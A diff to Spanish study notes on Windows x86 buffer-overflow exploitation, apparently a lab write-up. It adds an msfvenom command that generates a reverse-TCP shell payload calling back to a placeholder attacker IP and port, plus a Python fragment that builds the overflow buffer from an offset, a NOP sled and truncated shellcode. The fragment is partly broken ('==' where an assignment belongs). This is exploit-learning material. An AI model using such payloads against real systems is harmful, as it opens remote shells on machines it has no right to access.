@@ -101,9 +101,29 @@ Luego de volver a probar quedaria ir viendo en el dump de las seccion es de memo
 ahi nos damos cuenta que ademas del `\x00` falta el `\x0d`
 
 
+## Fase Shellcode
+
 como ya sabemos que son esos dos poruqe no hay mas badchars generamos entonces el shellcode con [[msfvenom]]
 
 ```shell
-msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=IP_ATACANTE LPORT=PUERTO_ATACANTE -e x86/shikata_ga_nai EXITFUNC=thread -f c -b ""
+msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=IP_ATACANTE LPORT=PUERTO_ATACANTE -e x86/shikata_ga_nai EXITFUNC=thread -f c -b '\x00\x0d'
 ```
+
+con ese reverse tcp solo aplicamos en el script y nos quedaria la variable para el buffer overflow de la siguiente manera
+
+```python
+OFFSET_EIP = 1787
+before_eip = b'A'*OFFSET_EIP
+eip= b'B'*4
+
+# esto es a modo de ejemplo
+badchars = (b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f")
+shellcode == b"\xb8\x1d\x7e\x3f\x1e\xda\xd6\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
+nops = b'\x90' * 16  # NOP sled
+
+payload = before_eip + eip + nops + shellcode
+```
+
+
+## Fase Encontrar Instruccion de Salto (JMP ESP)
 
